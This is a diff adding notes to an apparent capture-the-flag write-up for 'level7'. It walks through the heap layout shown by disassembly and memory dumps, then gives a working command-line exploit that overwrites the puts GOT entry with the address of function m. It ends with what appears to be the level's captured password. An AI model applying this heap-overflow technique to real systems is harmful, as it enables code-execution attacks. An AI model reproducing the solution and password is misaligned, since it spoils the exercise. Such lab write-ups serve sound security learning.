@@ -12,4 +12,79 @@ this algo will apply almost to any binary file to collect info about:
 	info frame, set $<regname>=<value>)
 
 
+804852a:       c7 04 24 08 00 00 00    movl   $0x8,(%esp)
+ 8048531:       e8 ba fe ff ff          call   80483f0 <malloc@plt>
+ 8048536:       89 44 24 1c             mov    %eax,0x1c(%esp)
+ 804853a:       8b 44 24 1c             mov    0x1c(%esp),%eax
+ 804853e:       c7 00 01 00 00 00       movl   $0x1,(%eax)
+ 8048544:       c7 04 24 08 00 00 00    movl   $0x8,(%esp)
+ 804854b:       e8 a0 fe ff ff          call   80483f0 <malloc@plt>
+ 8048550:       89 c2                   mov    %eax,%edx
+ 8048552:       8b 44 24 1c             mov    0x1c(%esp),%eax
+ 8048556:       89 50 04                mov    %edx,0x4(%eax)
+ 8048559:       c7 04 24 08 00 00 00    movl   $0x8,(%esp)
+ 8048560:       e8 8b fe ff ff          call   80483f0 <malloc@plt>
+ 8048565:       89 44 24 18             mov    %eax,0x18(%esp)
+ 8048569:       8b 44 24 18             mov    0x18(%esp),%eax
+ 804856d:       c7 00 02 00 00 00       movl   $0x2,(%eax)
+ 8048573:       c7 04 24 08 00 00 00    movl   $0x8,(%esp)
+ 804857a:       e8 71 fe ff ff          call   80483f0 <malloc@plt>
+
+
+this chunk of code allocates 8 bytes on a heap 4 times
+
+so we have:
+1 malloc: 0x804a008 [........]
+2 malloc: 0x804a018 [........]
+3 malloc: 0x804a028 [........]
+4 malloc: 0x804a038 [........]
+
+0x804a008	     804a018 		 804a028	     804a038 
+[........]|////////|[........]|////////|[........]|////////|[........]
+    |	      |		|	  |	     |	      |	         |
+    8         8         8         8          8        8          8
+
+than happens 2 strcpys:
+1) from argv[1] to 2 malloc (0x804a018)
+2) from argv[2] to 4 malloc (0x804a038)
+
+and if provide 2 correct arguments would get an output "~~"
+
+lets see what happens when we copying data in heap allocated buffers:
+
+lets print memory before and after each strcpy:
+
+before 1 strcpy:
+0x804a008:	0x00000001	0x0804a018 -> address m2
+0x804a018:	0x00000000	0x00000000
+0x804a028:	0x00000002	0x0804a038 -> addres m4		
+0x804a038:	0x00000000	0x00000000	
+
+after 1 strcpy:
+0x804a008:	0x00000001	0x0804a018 -> address to m2
+0x804a018:	0x61616161	0x61616161 "aaaaaaaaa"
+0x804a028:	0x00000002	0x0804a038 -> address to m4
+0x804a048:	0x00000000	0x00000000 
+
+after 2 strcpy:
+0x804a008:	0x00000001	0x0804a018 -> address to m2
+0x804a018:	0x61616161	0x61616161 "aaaaaaaaa"
+0x804a028:	0x00000002	0x0804a038 -> address to m4
+0x804a038:	0x62626262	0x62626262 "bbbbbbbbb"
+
+than it fopens "/home/user/level8/.pass", "r"
+and fills stack allocated buffer (maybe global var) with 68 bytes from this file
+and then prints "~~"
+there is a fucntion <m> which calls printf and prints that buffer
+
+so we somehow need to get there
+
+so the second strcpy writes into the address given m3[....(second part)]
+if we change this address to puts@plt we can overwrite it with the function <m>
+
+puts@plt addr: 0x08049928
+m addr: 0x080484f4
+./level7 $(python -c "print 'f' * 20 + '\x08\x04\x99\x28'[::-1]") $(python -c "print '\x08\x04\x84\xf4'[::-1]")
+
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 
